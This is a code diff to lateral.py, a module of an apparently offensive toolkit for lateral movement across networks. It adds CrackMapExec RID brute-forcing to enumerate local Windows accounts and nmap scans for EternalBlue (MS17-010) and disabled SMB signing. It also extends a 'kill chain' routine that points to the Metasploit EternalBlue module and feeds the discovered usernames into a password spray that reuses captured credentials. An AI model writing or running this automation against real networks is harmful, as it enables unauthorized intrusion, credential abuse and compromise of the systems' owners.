@@ -2,8 +2,56 @@
 lateral.py — Lateral movement via CrackMapExec + SSH
 """
 
-import subprocess, shutil
+import subprocess, shutil, re
 from . import tui
+
+
+# ── recon helpers ─────────────────────────────────────────────────────────────
+
+def rid_brute(ip: str, user: str = "", password: str = "") -> list[str]:
+    """
+    Enumerate local accounts via RID brute (CME --rid-brute).
+    Returns list of usernames found.
+    """
+    exe = shutil.which("crackmapexec") or shutil.which("cme")
+    if not exe:
+        return []
+    try:
+        out = subprocess.check_output(
+            [exe, "smb", ip, "-u", user, "-p", password,
+             "--local-auth", "--rid-brute"],
+            stderr=subprocess.STDOUT, text=True, timeout=30
+        )
+    except Exception:
+        return []
+    users = []
+    for line in out.splitlines():
+        m = re.search(r"\d+: \S+\\(\S+)\s+\(SidTypeUser\)", line)
+        if m:
+            name = m.group(1)
+            if name not in ("DefaultAccount", "WDAGUtilityAccount", "Invitado", "Guest"):
+                users.append(name)
+    return users
+
+
+def check_vulns(ip: str) -> dict:
+    """
+    Run nmap SMB vuln scripts. Returns dict of vuln name → bool.
+    """
+    if not shutil.which("nmap"):
+        return {}
+    scripts = "smb-vuln-ms17-010,smb2-security-mode"
+    try:
+        out = subprocess.check_output(
+            ["nmap", "--script", scripts, "-p", "445", "-T4", ip],
+            stderr=subprocess.STDOUT, text=True, timeout=60
+        )
+    except Exception:
+        return {}
+    return {
+        "ms17-010": "VULNERABLE" in out and "ms17-010" in out.lower(),
+        "signing_disabled": "Message signing enabled but not required" in out,
+    }
 
 
 def _cme(hosts: list[str], user: str, password: str,
@@ -97,10 +145,38 @@ def run_kill_chain(hosts: list[dict], creds: list[dict]) -> list[dict]:
         tui.warn("No credentials — cannot attempt lateral movement.")
         return []
 
-    results = []
-    smb_hosts = [h["ip"] for h in hosts if 445 in (h.get("ports") or [])]
-    ssh_hosts = [h["ip"] for h in hosts if 22  in (h.get("ports") or [])]
+    results      = []
+    smb_hosts    = [h["ip"] for h in hosts if 445 in (h.get("ports") or [])]
+    ssh_hosts    = [h["ip"] for h in hosts if 22  in (h.get("ports") or [])]
+    first_cred   = creds[0]
+    first_user   = first_cred.get("user", "")
+    first_pwd    = first_cred.get("secret", "") or first_cred.get("password", "")
 
+    # ── vuln scan + user enum on Windows targets ──────────────────────────────
+    for ip in smb_hosts:
+        tui.phase(f"RECON — {ip}")
+
+        vulns = check_vulns(ip)
+        if vulns.get("ms17-010"):
+            tui.warn(f"  {ip} is VULNERABLE to EternalBlue (MS17-010)!")
+            tui.info("  → Use Metasploit: exploit/windows/smb/ms17_010_eternalblue")
+        if vulns.get("signing_disabled"):
+            tui.info(f"  {ip} has SMB signing disabled — relay attacks possible")
+
+        tui.info(f"  Enumerating local accounts on {ip} ...")
+        extra_users = rid_brute(ip, first_user, first_pwd)
+        if extra_users:
+            tui.info(f"  Found accounts: {', '.join(extra_users)}")
+            # Add extra users to spray list with same passwords
+            for u in extra_users:
+                if u not in [c.get("user") for c in creds]:
+                    for c in list(creds):
+                        creds.append({"user": u,
+                                      "secret": c.get("secret", ""),
+                                      "service": c.get("service", "smb"),
+                                      "target": ip})
+
+    # ── credential-based lateral movement ─────────────────────────────────────
     for c in creds:
         user = c.get("user", "")
         pwd  = c.get("secret", "") or c.get("password", "")
